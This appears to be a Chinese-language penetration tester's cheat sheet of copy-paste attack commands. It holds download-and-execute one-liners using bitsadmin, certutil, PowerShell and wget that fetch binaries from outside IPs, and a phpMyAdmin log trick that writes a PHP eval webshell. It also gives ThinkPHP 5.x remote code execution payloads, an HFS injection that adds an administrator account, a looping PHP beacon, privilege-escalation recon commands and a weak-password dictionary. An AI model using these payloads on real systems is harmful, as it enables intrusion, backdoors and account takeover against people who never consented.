---
title: 常用复制粘贴
---


经常公布socks代理：[http://livesocksupdate.blogspot.com/](http://livesocksupdate.blogspot.com/)

pentesters arsenal tools:

- Metasploit
- Burp Suite
- w3af
- mitmproxy
- sqlmap
- Faraday
- fuzzdb
- radare2
- Nikto2
- nmap
- sublist3r

downloader常用方法如下：

·  certUtil
·  powershell
·  csc
·  vbs
·  JScript
·  hta
·  bitsadmin
·  wget
·  debug
·  ftp
·  ftfp

 1. bitsadmin /rawreturn /transfer getfile http://202.1.1.1/1.php.txt D:\1.txt
 2. powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://4.5.1.1/a.exe', '2.exe')"
 3. certutil.exe -urlcache -split -f https://raw.githubusercontent.com/3gstudent/test/master/version.txt file.txt

cmd 提权常用命令

    systeminfo | findstr OS #获取系统版本信息
    hostname  #获取主机名称
    whomai /priv  #显示当前用户的安全特权
    quser or query user  #获取在线用户
    netstat -ano | findstr 3389  #获取rdp连接来源IP
    dir c:\programdata\ #分析安装杀软
    wmic qfe get Caption,Description,HotFixID,InstalledOn  #列出已安装的补丁
    REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server\WinStations\RDP-Tcp /v PortNumber  #获取远程端口
    tasklist /svc | find "TermService" + netstat -ano  #获取远程端口

phpmyadmin general_log 添加webshell

    set global general_log = 1;
    set global general_log_file ='D:/phpStudy4IIS/WWW/phpmyadmin/aa.php';
    select '<?php eval($_REQUEST[123]);?>';
    set global general_log = 0;
    set global general_log_file =null;

菜刀添加数据库连接:

    <T>MYSQL</T><H>localhost</H><U>root</U><P>Unser251#</P><L>utf8</L>


    
linux shell 下载执行：

    wget  http://100.100.100.0/aelf -O /tmp/a && chmod +x /tmp/a && setsid /tmp/a

thinkphp5 测漏洞:

    https://www.waitalone.cn/thinkphp-getshell.html
    
    /?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1
    /?s=index/\think\Request/input&filter=phpinfo&data=-1
    
    无写权限执行任意代码：
    s=index/\think\app/invokefunction&function=assert&vars[0]=eval(($_POST['a']))
    s=index/\think\app/invokefunction&function=assert&vars[0]=eval(base)
    5.0.x版本

    s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1
    
    s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id

    5.1.x版本

    s=index/\think\Request/input&filter=phpinfo&data=1 s=index/\think\Request/input&filter=system&data=id
    s=index/\think\template\driver\file/write&cacheFile=shell.php&content=%3C?php%20phpinfo();?%3E                             s=index/\think\view\driver\Php/display&content=%3C?php%20phpinfo();?%3E                                                   s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1                         s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id

hfs 命令执行漏洞:

    ?search==%00{.exec|cmd.exe /c net user test1234 1234 /add.}    
    ?search==%00{.exec|cmd.exe /c net localgroup administrators test1234 /add.}

php 后台运行
```
ignore_user_abort(true);
set_time_limit(10); 
ob_end_clean();
header("Connection: close");
flush();
if (function_exists("fastcgi_finish_request")) {
fastcgi_finish_request();
}
while(1)
    file_get_contents("http://1.1.1.1/1.php.txt");

```

发包模拟tcp:

    iptables -A OUTPUT -p tcp --tcp-flags RST RST -j DROP

powershell常用：

    打包:
    powershell -Command "Compress-Archive -LiteralPath D:\mt4mate\upfile\115   -DestinationPath  D:\mt4mate\upfile\115\a.zip"

    powershell -command "Add-Type -Assembly 'System.IO.Compression.FileSystem' ; [System.IO.Compression.ZipFile]::CreateFromDirectory('d:\1\upfile\115\images', 'd:\1\upfile\1.zip') ;"
    
    下载：
    powershell -Command "Invoke-WebRequest -Uri http://41.11.1.1/a.exe -OutFile     a.exe"

    删除文件：
    powershell -Command "Remove-Item a.exe -Force"

    执行默认功能：
    powershell -Command "Invoke-Item D:\mt4mate\upfile\115\a.exe"

XSS 字段:

    HTTP_X_FORWARDED_FOR
    HTTP_CLIENT_IP
    REMOTE_ADDR


找3389端口:

    tasklist 找 svchost termservice 找到pid
    然后netstat 查看pid 对应监听端口

弱口令:

    qwerasdf
    computer
    zxczxczxc
    dddddddd
    299792458
    135792468
    20082008
    369369369
    5845211314
    yangyang
    csdncsdn
    google250
    woaini520
    zhang123
    1234567b
    wocaonima
    1233211234567
    9876543210
    qaz123456
    q123456789
    321654987
    369258147
    aaa123456
    1357924680
    123321aa
    25257758
    wojiushiwo
    ssssssss
    qazwsx123
    123456aaa
    1234567a
    z123456789
    woainima
    44444444
    buzhidao
    ffffffff
    100200300
    12345679
    12369874
    1122334455
    111111
    woaini123
    qwe123456
    xiaoxiao
    123456654321
    woshishui
    12301230
    1234554321
    5201314520
    12345612
    lilylily
    123456asd
    10101010
    1q2w3e4r5t
    11235813
    12345600
    11111111111111111111
    wwwwwwww
    0987654321
    5845201314
    zxcvbnm123
    kingcom5
    123456987
    05962514787
    321321321
    woaiwojia
    1qazxsw2
    123qweasd
    1234abcd
    woaini1314
    12345678a
    q1w2e3r4
    asdfghjk
    1123581321
    123698745
    asdf1234
    521521521
    147852369
    123456qq
    3.1415926
    qweqweqwe
    111222333
    zzzzzzzz
    ms0083jxj
    11112222
    code8925
    qweasdzxc
    77777777
    asd123456
    qwer1234
    33333333
    55555555
    741852963
    963852741
    520520520
    123456123456
    999999999
    123456aa
    99999999
    asdfasdf
    aa123456
    123456789a
    qwertyui
    1234qwer
    a1234567
    123456123
    123456
    a12345678
    abc123456
    123321123
    22222222
    asdasdasd
    110110110
    12341234
    abcd1234
    qazwsxedc
    12121212
    123654789
    0123456789
    123456abc
    1q2w3e4r
    asdfghjkl
    0000000000
    12344321
    31415926
    iloveyou
    qq123456
    qwertyuiop
    000000000
    qqqqqqqq
    87654321
    password
    789456123
    xiazhili
    1qaz2wsx
    11223344
    a123456789
    66666666
    1111111111
    aaaaaaaa
    987654321
    147258369
    111111111
    88888888
    1234567890
    123123123
    00000000
    dearbook
    11111111
    12345678
    123456789

















